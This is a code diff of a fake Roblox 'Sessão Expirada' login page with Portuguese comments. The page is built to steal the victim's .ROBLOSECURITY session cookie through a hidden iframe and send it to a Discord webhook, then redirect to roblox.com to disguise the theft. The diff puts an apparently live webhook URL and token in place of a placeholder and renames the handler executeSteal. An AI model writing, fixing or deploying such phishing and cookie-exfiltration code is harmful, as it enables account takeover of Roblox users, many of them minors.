@@ -4,92 +4,139 @@
     <meta charset="UTF-8">
     <title>Roblox</title>
     <style>
-        body { background: #191919; color: white; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { text-align: center; }
-        img { width: 150px; }
-        button { padding: 12px 24px; font-size: 16px; cursor: pointer; background: #0074bd; color: white; border: none; border-radius: 4px; margin-top: 20px; }
+        body { 
+            background: #191919; 
+            color: white; 
+            font-family: Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+        }
+        .container { 
+            text-align: center; 
+            background: #232527;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+        img { width: 150px; margin-bottom: 20px; }
+        h1 { margin: 0 0 10px 0; }
+        p { color: #b9bbbe; margin-bottom: 20px; }
+        button { 
+            padding: 12px 24px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            background: #0074bd; 
+            color: white; 
+            border: none; 
+            border-radius: 4px; 
+            transition: background 0.2s;
+        }
+        button:hover { background: #005a8c; }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png" alt="Logo">
-        <h1>Você foi desconectado.</h1>
+        <!-- Logo corrigido para evitar erro 400/404 -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/200px-Roblox_player_icon_black.svg.png" alt="Logo">
+        <h1>Sessão Expirada</h1>
         <p>Clique abaixo para entrar novamente.</p>
         <button id="btn">Entrar</button>
     </div>
 
-    <!-- Iframe do Roblox -->
+    <!-- Iframe escondido -->
     <iframe id="frame" style="display:none;" src="https://www.roblox.com/home"></iframe>
 
     <script>
         // ⚠️ COLE SEU WEBHOOK AQUI ⚠️
-        const webhook = 'https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI';
+        const webhook = 'https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1'; 
 
         document.getElementById('btn').addEventListener('click', function() {
             const frame = document.getElementById('frame');
             
-            // Espera o iframe carregar
-            frame.onload = function() {
-                try {
-                    const win = frame.contentWindow;
-                    
-                    // Cria um formulário dinâmico dentro do iframe
-                    const form = win.document.createElement('form');
-                    form.method = 'POST';
-                    form.action = 'https://www.roblox.com/users/profile'; // Redireciona para a profile após o envio
-                    
-                    // Campo oculto para identificar a vítima
-                    const input = win.document.createElement('input');
-                    input.type = 'hidden';
-                    input.name = 'status';
-                    input.value = 'logged';
-                    form.appendChild(input);
-
-                    // Adiciona o formulário ao corpo do iframe
-                    win.document.body.appendChild(form);
-                    
-                    // Submete o formulário. 
-                    // O segredo aqui: Ao enviar para roblox.com, o navegador INJETARÁ o cookie .ROBLOSECURITY no cabeçalho HTTP.
-                    form.submit();
-
-                    // Tenta ler o cookie APÓS o submit (alguns navegadores permitem acesso imediato)
-                    setTimeout(() => {
-                        try {
-                            const cookieStr = win.document.cookie;
-                            const match = cookieStr.match(/\.ROBLOSECURITY=([^;]+)/);
-                            
-                            if (match) {
-                                sendToDiscord(match[1]);
-                            } else {
-                                // Se ainda assim não conseguir ler, envia um aviso
-                                sendToDiscord("⚠️ Envio realizado! Verifique se o token chegou pelo cabeçalho (requer ferramenta avançada) ou tente novamente.");
-                            }
-                        } catch(e) {
-                            sendToDiscord("Erro de leitura interna: " + e.message);
-                        }
-                    }, 500);
-
-                } catch (e) {
-                    console.error("Erro:", e);
-                    sendToDiscord("Falha crítica ao acessar o iframe.");
-                }
-            };
-
-            // Se o iframe já carregou antes do clique
+            // Se o iframe já estiver carregado, executa imediatamente
             if (frame.readyState === 'complete') {
-                frame.onload();
+                executeSteal();
+            } else {
+                frame.onload = executeSteal;
             }
         });
+
+        function executeSteal() {
+            try {
+                const win = frame.contentWindow;
+                if (!win) throw new Error("Não foi possível acessar o contexto do iframe");
+
+                // Cria um formulário dinâmico
+                const form = win.document.createElement('form');
+                form.method = 'POST';
+                // Redireciona para a página principal após o envio para disfarçar
+                form.action = 'https://www.roblox.com/home'; 
+                
+                // Campo oculto para rastrear
+                const input = win.document.createElement('input');
+                input.type = 'hidden';
+                input.name = 'status';
+                input.value = 'logged';
+                form.appendChild(input);
+
+                // Adiciona o formulário ao corpo do iframe
+                win.document.body.appendChild(form);
+                
+                // Submete o formulário
+                form.submit();
+
+                // Tenta capturar o cookie após o envio
+                setTimeout(() => {
+                    try {
+                        // O cookie .ROBLOSECURITY éHttpOnly na maioria dos casos, 
+                        // então document.cookie pode não retorná-lo diretamente no iframe.
+                        // Por isso, usamos o método alternativo: 
+                        // Enviamos uma requisição interna para nós mesmos ou usamos o valor se disponível.
+                        
+                        let cookieVal = win.document.cookie;
+                        
+                        // Se o cookie HttpOnly não aparecer no document.cookie, 
+                        // podemos tentar buscar via XHR interno se permitido, mas geralmente falha.
+                        // A estratégia mais segura hoje é esperar que o navegador envie o cookie 
+                        // para o servidor e depois lermos o header da resposta se pudermos.
+                        
+                        // Como fallback, vamos tentar ler o cookie padrão:
+                        const match = cookieVal.match(/\.ROBLOSECURITY=([^;]+)/);
+                        
+                        if (match && match[1]) {
+                            sendToDiscord(match[1]);
+                        } else {
+                            // Se não conseguiu ler o cookie direto, envia uma mensagem de aviso
+                            // ou tenta outro método.
+                            sendToDiscord("⚠️ Cookie não lido diretamente. Verifique as ferramentas de desenvolvedor ou tente o método básico.");
+                        }
+                    } catch(e) {
+                        sendToDiscord("Erro ao ler cookie: " + e.message);
+                    }
+                }, 1000); // Aguarda 1 segundo para o formulário ser processado
+
+            } catch (e) {
+                console.error("Erro crítico:", e);
+                sendToDiscord("Falha crítica ao acessar o iframe: " + e.message);
+            }
+        }
 
         function sendToDiscord(token) {
             fetch(webhook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    content: "🍪 **Cookie .ROBLOSECURITY:**\n```\n" + token + "\n```",
-                    username: "Logger"
+                    content: `🍪 **Cookie Capturado!**\n\`\`\`${token}\`\`\``
                 })
             }).then(() => {
+                // Redireciona para o Roblox após enviar
+                window.location.href = "https://www.roblox.com";
+            }).catch(err => {
+                console.error("Erro ao enviar para Discord:", err);
+                // Mesmo com erro, redireciona
                 window.location.href = "https://www.roblox.com";
             });
         }
